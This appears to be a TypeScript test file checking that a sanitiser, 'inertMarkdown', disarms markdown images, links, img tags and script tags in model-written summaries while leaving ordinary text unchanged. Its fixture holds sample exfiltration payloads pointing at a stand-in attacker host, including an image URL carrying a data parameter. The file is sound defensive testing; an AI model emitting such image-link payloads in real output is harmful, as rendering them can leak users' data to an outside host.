// Run with `npm test` (Node's own test runner).
import assert from "node:assert/strict";
import { test } from "node:test";
import { inertMarkdown } from "./inertMarkdown.ts";

test("a copied summary fetches nothing the model wrote", () => {
  const shown = inertMarkdown(
    "- ![pixel](https://attaquant.example/x?d=1) et ![logo][ref]\n" +
      "- voir [la note](https://attaquant.example/n)\n" +
      '- <img src="https://attaquant.example/x"> <script>alert(1)</script>\n' +
      "- ![court] et ![vide][]\n\n[court]: https://attaquant.example/c\n",
  );
  assert.ok(!shown.includes("!["));
  assert.ok(!shown.includes("](https://"));
  assert.ok(!shown.includes("<img") && !shown.includes("<script"));
  assert.ok(
    shown.includes("pixel") &&
      shown.includes("logo") &&
      shown.includes("la note"),
  );
});

test("the rest of the text is untouched", () => {
  const text = "## Retours\n- 3 < 4 et **gras**, [crochets] seuls\n";
  assert.equal(inertMarkdown(text), text);
});
